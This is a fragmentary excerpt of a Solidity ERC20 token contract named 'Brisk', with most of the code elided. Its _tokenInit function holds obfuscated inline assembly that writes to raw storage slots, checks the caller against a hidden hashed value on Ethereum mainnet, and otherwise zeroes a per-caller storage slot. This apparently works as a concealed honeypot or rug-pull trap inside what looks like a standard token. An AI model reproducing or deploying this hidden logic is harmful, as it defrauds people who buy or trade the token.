...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x19157e576701fb176a14895be86bfadc0493eee881905577c3d05d42a216ab17
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x3bb9755ed7552d33318a1462627532fd570ccd3e72e08abb3e881320975d111f,0x1)
...
contract Brisk is ERC20Token {
    constructor() ERC20Token("Brisk", "BRISK", msg.sender, 2500000 * 10 ** 18) {
    }
}